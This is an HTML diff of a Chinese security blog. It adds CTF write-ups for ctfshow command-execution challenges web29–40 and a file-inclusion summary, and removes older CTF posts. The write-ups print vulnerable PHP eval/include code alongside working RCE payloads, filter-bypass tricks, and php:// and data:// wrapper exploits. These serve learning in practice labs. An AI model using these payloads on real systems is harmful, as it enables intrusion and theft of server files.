@@ -64,6 +64,199 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-命令执行练习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%83%E4%B9%A0/" class="article-date">
+  <time datetime="2022-09-15T15:34:43.000Z" itemprop="datePublished">2022-09-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%83%E4%B9%A0/">命令执行练习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>代码执行</strong>本质上是调用后端语言（PHP，JAVA……）来执行特定代码，而<strong>命令执行</strong>本质是调用系统的命令执行的接口，与对于的不同的语言无关，只与系统的版本有关。</p>
+<p>命令执行练习之ctfshow系列</p>
+<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>打开靶场看到以下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审计源代码，有个eval函数，首先考虑命令执行，然后传入的值不能包括flag这个单词</p>
+<p>先构造payload查看当前目录下有哪些文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>然后发现有个flag.php，接着构造payload，这提供几种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;cat fla?.php&#x27;);</span><br><span class="line">?c=system(&#x27;cat fla*.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>第一种是使用cat(用tac也可以)查看文件内容，但是因为不能存在flag，所以就用?或者*占位符匹配字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;cp fla?.php 1.txt&#x27;);</span><br><span class="line">/1.txt</span><br></pre></td></tr></table></figure>
+
+<p>第二种是用cp命令将flag.php里的值复制到1.txt里面，然后查看1.txt就可以了</p>
+<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>打开靶场发现以下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审计源码，发现和29一样，只不过多过滤了system和php</p>
+<p>这里可以用到（``）反引号:执行系统命令，但是只是执行，不会打印结果，所以需要echo打印，能起到system的效果</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat fla?.???`;</span><br><span class="line">?c=echo `cat *`;</span><br></pre></td></tr></table></figure>
+
+<p>也可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=`cp fla?.??? 1.txt`</span><br></pre></td></tr></table></figure>
+
+<p>这里因为不需要打印结果，只要把flag.php的内容粘贴到1.txt上就好了，所以不需要echo</p>
+<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>打开靶场</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现对比30还多过滤了cat,.,空格</p>
+<p>空格绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.$&#123;IFS&#125;</span><br><span class="line">2.$IFS$1</span><br><span class="line">3.$&#123;IFS</span><br><span class="line">4.%20</span><br><span class="line">5.&lt;和&lt;&gt;重定向符</span><br><span class="line">6.%09</span><br></pre></td></tr></table></figure>
+
+<p>因为还过滤了.，所以就不能用.php了，直接f*匹配</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo%09`tac%09f*`;</span><br></pre></td></tr></table></figure>
+
+<p>第二种解法：沙盒逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;cat flag.php&#x27;);嵌套脱离了c的正则判断</span><br></pre></td></tr></table></figure>
+
+<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p>打开靶场</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次过滤的东西更多了分号，echo，单引号，反引号全被过滤，之前的方法就都不能用了</p>
+<p>分号的绕过方法?&gt;，因为php的最后一行代码可以不用加分号，所以可以用?&gt;绕过分号，但是因为是最后一行代码了，所以后面就不能跟php代码，所以逃逸后面的system就不能用了</p>
+<p>在这里就用include</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和32一样，但是过滤了”，那就不用“，include可以不用加括号，常见的不用加括号的函数</p>
+<p><code>echo</code>、<code>print</code>、<code>isset</code>、<code>unset</code>、<code>include</code>、<code>require</code>，但是遇到普通的字符串要加引号</p>
+<h3 id="web34-36"><a href="#web34-36" class="headerlink" title="web34-36"></a>web34-36</h3><p>可以用33的payload改造下</p>
+<h3 id="web37（伪协议绕过）"><a href="#web37（伪协议绕过）" class="headerlink" title="web37（伪协议绕过）"></a>web37（伪协议绕过）</h3><p>打开靶场</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题考点是伪协议，data协议会把后面的字符串当成php代码执行</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;cat fla?.???&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多过滤了php和file，可以用&lt;?=来代替&lt;?php</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?= system(&#x27;cat fla?.???&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里在c后面加上php，因为payload后面已经用?&gt;闭合了，所以加上.php也没用，用之前的payload就可以解决</p>
+<h3 id="web40（RCE无参数绕过）"><a href="#web40（RCE无参数绕过）" class="headerlink" title="web40（RCE无参数绕过）"></a>web40（RCE无参数绕过）</h3><p>先打开靶场</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现过滤了一大堆（注意这里的括号是中文括号，所以英文的没影响），前面做的用include包含的也因为绕过了？和&gt;不能用了，看了一下大佬的wp，发现可以用r无参数绕过</p>
+<p>无参数rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果</p>
+<p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个正则的意思就是如果是一个字符串加（）的形式，就用空格替代，（？R）？指的是递归引用表达式，最后的结果就是a(b(c()))经过第一次过滤变成了a(b()),然后过滤成a()，最后就只剩下了个；，；等于；，然后就eval执行，但是如果里面有参数，那参数就一直会存在，最后就等于不了</p>
+<p>遇到这种情况，就使用不需要参数的函数get_defined_vars()</p>
+<p>函数get_defined_vars()返回由所有已定义变量组成的数组</p>
+<p>先构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>
+
+<p>获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [_GET] =&gt; Array ( [c] =&gt; print_r(get_defined_vars()); ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( ) [_FILES] =&gt; Array ( ) [c] =&gt; print_r(get_defined_vars()); )</span><br></pre></td></tr></table></figure>
+
+<p>返回的值是一个二维数组，用get方法传入的数据在第一个数组里面，然后用current()将二维数组转为一维数组，current()的作用是返回数组中的当前单元，默认是返回第一个</p>
+<p>再构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(current(get_defined_vars()));</span><br></pre></td></tr></table></figure>
+
+<p>现在就只返回了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [c] =&gt; print_r(current(get_defined_vars())); )</span><br></pre></td></tr></table></figure>
+
+<p>这已经是个一维数组了，然后再用end函数以字符串输出最后的值，然后用eval执行就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;tac fla?.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这是用get方法最后的payload，还可以用post传入数据，差别就是post用next函数，可以获取这个数组的下一个位置的元素，就是get的下一个post，然后再用array_pop函数将元素输出出来</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">1=system(&#x27;tac fla?.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%83%E4%B9%A0/" data-id="cl88x5q0i0000t8dqbv1y28v6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-文件包含/文件包含绕过总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/09/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2022-09-13T15:40:04.000Z" itemprop="datePublished">2022-09-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/09/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">文件包含绕过总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>总结一下文件包含各种绕过方法</p>
+<p>1.filter</p>
+<p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>这里的convert.base64是解释器，还有多种解释器</p>
+<p>2.php://input</p>
+<p>post传入数据就好了</p>
+<p>3.data</p>
+<p>data://text/plain;base64,”要执行的代码”   比如说system(‘ls’)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" data-id="cl88x5q0q0003t8dq7zogcpwd" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-python爬虫学习" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/09/09/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/" class="article-date">
@@ -645,117 +838,6 @@
 
 
   
-    <article id="post-代码审计" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
-  <time datetime="2022-08-27T09:26:30.000Z" itemprop="datePublished">2022-08-27</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>又是长见识的一道题buu的[网鼎杯 2020 朱雀组]phpweb，打开靶场，发现了/var/www/html/index.php这串代码，那就添加到url上，发现有个页面一闪而过，burp抓包</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/4ccf26a02b0c4c07b02ffe9d276a7017.png" alt="img"></p>
-<p>发现有post了两个参数func和p，不知道他们有什么联系，就用<strong>md5</strong>来试试</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180202860.png" alt="image-20220827180202860"></p>
-<p>在回显的页面上发现了md5（123）的值，所以可以确定是func（p）这样的形式，那就用<strong>file_get_contents或者highlight_flie来读取下index.php</strong></p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180645656.png" alt="image-20220827180645656"></p>
-<p>回显了这么一串代码，审计一下，发现可以利用test类反序列化来使页面返回想要的结果，那就试试反序列化</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180805131.png" alt="image-20220827180805131"></p>
-<p>得到返回结果</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/d4b1b39dbf394072a5e5f7dcc0a39b29.png" alt="在这里插入图片描述"></p>
-<p>那就直接<strong>system(“find / -name flag”)：查找所有文件名匹配flag的文件</strong></p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180930400.png" alt="image-20220827180930400"></p>
-<p>得到以下返回结果</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/c7d1fbbd647f41fcbc34aa065f13bf85.png" alt="在这里插入图片描述"></p>
-<p>最后再cat tmp/flag。。。就得到flag了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="cl7xiuasi000v98dqhhvl273t" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-文件包含1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/08/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1/" class="article-date">
-  <time datetime="2022-08-26T15:12:27.000Z" itemprop="datePublished">2022-08-26</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/08/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1/">文件包含1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>文件包含练习题，buu的[ZJCTF 2019]NiZhuanSiWei</p>
-<p>先打开靶场，发现以下代码</p>
-<p><img src="file:///C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20220826222317179.png" alt="image-20220826222317179"></p>
-<p>审计代码，发现需要绕过三个条件</p>
-<p>第一个，需要有一个名为text，内容为welcome to the zjctf的文件传入file_get_contents函数，这个函数的作用就是获取一个文件的内容，绕过方式是用伪协议php://input（将一个） ，然后post传入内容，或者利用data伪协议?text=data:text/plain,welcome to the zjctf</p>
-<p>第二个，include包含useless.php文件，但是不能含有flag字段，因为是php文件，想要查看里面的内容就用<strong>php://filter伪协议</strong></p>
-<p>第三个就是传入的password的值要是一个序列化过后的值，我们一步一步来，先用firefox的post传入welcome to the zjctf</p>
-<p><img src="https://img-blog.csdnimg.cn/20200421151933730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>然后再?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</p>
-<p><img src="https://img-blog.csdnimg.cn/20200421152318724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>得到一串base64编码，解码过后</p>
